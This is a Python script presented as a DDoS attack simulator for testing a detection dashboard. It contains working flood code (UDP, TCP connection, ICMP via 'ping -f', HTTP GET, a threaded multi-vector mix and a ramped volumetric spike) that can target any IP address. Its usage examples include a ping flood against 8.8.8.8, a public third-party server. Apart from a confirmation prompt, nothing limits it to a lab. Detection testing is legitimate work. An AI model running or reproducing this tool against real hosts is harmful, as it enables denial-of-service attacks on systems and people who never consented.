#!/usr/bin/env python3
"""
Attack Simulation Script for DDoS Detection Testing
Generates various types of simulated traffic to test detection capabilities
"""

import socket
import struct
import random
import time
import argparse
import threading
import sys
from concurrent.futures import ThreadPoolExecutor

def get_local_ip():
    """Get the local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def udp_flood(target_ip, target_port, duration, pps):
    """
    Simulate UDP flood attack
    """
    print(f"[UDP FLOOD] Starting attack -> {target_ip}:{target_port} at {pps} pps for {duration}s")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'X' * 1024  # 1KB payload
    
    start_time = time.time()
    packets_sent = 0
    interval = 1.0 / pps if pps > 0 else 0.001
    
    while time.time() - start_time < duration:
        try:
            sock.sendto(payload, (target_ip, target_port))
            packets_sent += 1
            
            # Rate limiting
            if pps < 10000:
                time.sleep(interval)
            
        except Exception as e:
            pass
    
    sock.close()
    elapsed = time.time() - start_time
    actual_pps = packets_sent / elapsed if elapsed > 0 else 0
    print(f"[UDP FLOOD] Complete: {packets_sent} packets, {actual_pps:.0f} actual pps")
    return packets_sent

def tcp_syn_simulation(target_ip, target_port, duration, connections_per_sec):
    """
    Simulate SYN flood by opening many connections
    (Note: Real SYN flood requires raw sockets and root)
    """
    print(f"[TCP SYN SIM] Starting -> {target_ip}:{target_port} at {connections_per_sec} conn/s for {duration}s")
    
    start_time = time.time()
    connections = 0
    failed = 0
    
    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((target_ip, target_port))
            sock.close()
            connections += 1
        except:
            failed += 1
        
        if connections_per_sec < 1000:
            time.sleep(1.0 / connections_per_sec)
    
    print(f"[TCP SYN SIM] Complete: {connections} connections, {failed} failed")
    return connections

def icmp_flood(target_ip, duration, pps):
    """
    Simulate ICMP flood using ping subprocess
    """
    import subprocess
    
    print(f"[ICMP FLOOD] Starting ping flood -> {target_ip} for {duration}s")
    
    try:
        # Use ping with flood option (requires root)
        proc = subprocess.Popen(
            ['ping', '-f', '-w', str(duration), target_ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = proc.communicate(timeout=duration + 5)
        print(f"[ICMP FLOOD] Complete")
        print(stdout.decode() if stdout else "")
    except subprocess.TimeoutExpired:
        proc.kill()
        print("[ICMP FLOOD] Timeout, terminated")
    except Exception as e:
        print(f"[ICMP FLOOD] Error: {e}")
        print("Note: ICMP flood requires root privileges. Try: sudo python3 attack_simulator.py --type icmp")

def http_flood(target_ip, target_port, duration, rps):
    """
    Simulate HTTP GET flood
    """
    print(f"[HTTP FLOOD] Starting -> {target_ip}:{target_port} at {rps} req/s for {duration}s")
    
    request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
    
    start_time = time.time()
    requests_sent = 0
    
    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target_ip, target_port))
            sock.send(request.encode())
            sock.close()
            requests_sent += 1
        except:
            pass
        
        if rps < 1000:
            time.sleep(1.0 / rps)
    
    print(f"[HTTP FLOOD] Complete: {requests_sent} requests")
    return requests_sent

def mixed_attack(target_ip, duration):
    """
    Simulate mixed attack (UDP + TCP + ICMP)
    """
    print(f"[MIXED ATTACK] Starting multi-vector attack -> {target_ip} for {duration}s")
    
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = [
            executor.submit(udp_flood, target_ip, 53, duration, 500),
            executor.submit(udp_flood, target_ip, 123, duration, 500),
            executor.submit(tcp_syn_simulation, target_ip, 80, duration, 100),
            executor.submit(tcp_syn_simulation, target_ip, 443, duration, 100),
        ]
        
        for future in futures:
            try:
                future.result()
            except Exception as e:
                print(f"Error: {e}")
    
    print("[MIXED ATTACK] Complete")

def volumetric_spike(target_ip, duration, max_pps):
    """
    Simulate sudden traffic spike (volumetric attack pattern)
    """
    print(f"[VOLUMETRIC SPIKE] Ramping up traffic to {target_ip}")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'X' * 512
    
    start_time = time.time()
    ramp_duration = duration / 3
    
    while time.time() - start_time < duration:
        elapsed = time.time() - start_time
        
        # Ramp up, sustain, ramp down
        if elapsed < ramp_duration:
            current_pps = int(max_pps * (elapsed / ramp_duration))
        elif elapsed < ramp_duration * 2:
            current_pps = max_pps
        else:
            remaining = duration - elapsed
            current_pps = int(max_pps * (remaining / ramp_duration))
        
        current_pps = max(10, current_pps)
        interval = 1.0 / current_pps
        
        try:
            sock.sendto(payload, (target_ip, 12345))
        except:
            pass
        
        time.sleep(interval)
    
    sock.close()
    print("[VOLUMETRIC SPIKE] Complete")

def main():
    parser = argparse.ArgumentParser(
        description='DDoS Attack Simulator for Testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # UDP flood to local machine
  python3 attack_simulator.py --type udp --target 127.0.0.1 --duration 30 --pps 1000
  
  # TCP SYN simulation
  python3 attack_simulator.py --type tcp --target 192.168.1.100 --port 80
  
  # ICMP flood (requires root)
  sudo python3 attack_simulator.py --type icmp --target 8.8.8.8
  
  # Mixed attack
  python3 attack_simulator.py --type mixed --target 127.0.0.1
  
  # Traffic spike simulation
  python3 attack_simulator.py --type spike --target 127.0.0.1 --pps 5000
        """
    )
    
    parser.add_argument(
        '--type', '-t',
        choices=['udp', 'tcp', 'icmp', 'http', 'mixed', 'spike'],
        default='udp',
        help='Attack type (default: udp)'
    )
    
    parser.add_argument(
        '--target', '-T',
        default=get_local_ip(),
        help=f'Target IP (default: your IP {get_local_ip()})'
    )
    
    parser.add_argument(
        '--port', '-p',
        type=int,
        default=12345,
        help='Target port (default: 12345)'
    )
    
    parser.add_argument(
        '--duration', '-d',
        type=int,
        default=30,
        help='Attack duration in seconds (default: 30)'
    )
    
    parser.add_argument(
        '--pps',
        type=int,
        default=1000,
        help='Packets per second (default: 1000)'
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("DDoS Attack Simulator - FOR TESTING ONLY")
    print("=" * 60)
    print(f"Attack Type: {args.type.upper()}")
    print(f"Target: {args.target}:{args.port}")
    print(f"Duration: {args.duration}s")
    print(f"Rate: {args.pps} pps")
    print("=" * 60)
    print()
    
    # Confirmation
    response = input("Start attack simulation? [y/N]: ")
    if response.lower() != 'y':
        print("Cancelled.")
        return
    
    print()
    
    if args.type == 'udp':
        udp_flood(args.target, args.port, args.duration, args.pps)
    elif args.type == 'tcp':
        tcp_syn_simulation(args.target, args.port, args.duration, args.pps)
    elif args.type == 'icmp':
        icmp_flood(args.target, args.duration, args.pps)
    elif args.type == 'http':
        http_flood(args.target, args.port, args.duration, args.pps)
    elif args.type == 'mixed':
        mixed_attack(args.target, args.duration)
    elif args.type == 'spike':
        volumetric_spike(args.target, args.duration, args.pps)
    
    print()
    print("Attack simulation complete. Check the dashboard for detection results.")

if __name__ == '__main__':
    main()
